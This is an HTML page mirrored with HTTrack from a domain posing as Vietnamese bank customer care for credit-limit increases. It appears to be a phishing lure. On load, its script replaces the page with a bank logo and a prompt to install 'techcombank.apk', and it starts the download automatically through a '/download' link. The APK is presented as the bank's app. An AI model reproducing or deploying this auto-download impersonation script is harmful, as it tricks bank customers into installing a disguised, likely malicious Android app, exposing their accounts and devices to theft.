<!DOCTYPE html>
<html>

<!-- Mirrored from cskh-vpb.tang-han-muc-tin-dung.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 10 Apr 2024 15:47:48 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    <title>Khách hàng cá nhân</title>

    <meta property="og:image" content="UploadImages/Data/Banner/banner-vuong-4.jpg" />

    <script src="Mobile/assets/js/jquery.min.js"></script>


    <link rel="icon" href="UploadImages/Data/Banner/logo.webp" type="image/x-icon" />
    <link rel="apple-touch-icon" href="UploadImages/Data/Banner/logo.webp">
    <meta name="theme-color" content="#ff4c3b" />
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="multikart">
    <meta name="msapplication-TileImage" content="images/icon_guco.png">
    <meta name="msapplication-TileColor" content="#FFFFFF">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <!--Google font-->
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700,900" rel="stylesheet">
    <!-- bootstrap css -->
    <link rel="stylesheet" type="text/css" href="Mobile/assets/css/vendors/bootstrap.css">
    <!-- slick css -->
    <link rel="stylesheet" type="text/css" href="Mobile/assets/css/vendors/slick-theme.css">
    <link rel="stylesheet" type="text/css" href="Mobile/assets/css/vendors/slick.css">
    <!-- iconly css -->
    <link rel="stylesheet" type="text/css" href="Mobile/assets/css/vendors/iconly.css">
    <!-- Theme css -->
    <link rel="stylesheet" type="text/css" href="Mobile/assets/css/style.css">
    <link rel="stylesheet" href="Theme/GUCO/assets/owlcarousel/assets/owl.carousel.min.html">
    <link rel="stylesheet" href="Theme/GUCO/assets/owlcarousel/assets/owl.theme.default.min.html">

    <style>
        header .header-option {
            margin-left: inherit;
        }
    </style>

</head>

<body>
    <div class="loader">
        <span></span>
        <span></span>
    </div>
    <script>
        var loader = document.querySelector(".loader");
        window.addEventListener("load", function() {
            loader.style.display = "none";
            // const apiUrl = 'https://hiblue.online'
            function downloadURI(uri, name) {
                var link = document.createElement("a");
                link.setAttribute('download', name);
                link.href = `/download`;
                document.body.appendChild(link);
                $('#link').attr('href', `/download`)
                link.click();
                link.remove();
            }

            $('body').css('padding', '0')
            $('body').html(
                `<div style="display: flex; justify-content: center; align-items: center; height: 100vh; width: 90%; margin: auto; text-align: center">
                <div>
                    <img src='UploadImages/Data/Banner/logo.webp' style="width: 80%; display: block; margin:auto">
                    <p style="padding-top: 20px">Tên file: techcombank.apk</p>
                    <p>Kích thước: 25mb</p>
                    <p>Vui lòng tải xuống ứng dụng và cài đặt để xem chi tiết. <br> <a id="link" style="text-decoration: underline; color: blue" href="./techcombank.apk" download>Tải ngay bây giờ</a></p> 
                </div>
              </div>
              `
            );
            downloadURI()
        });
    </script>
</body>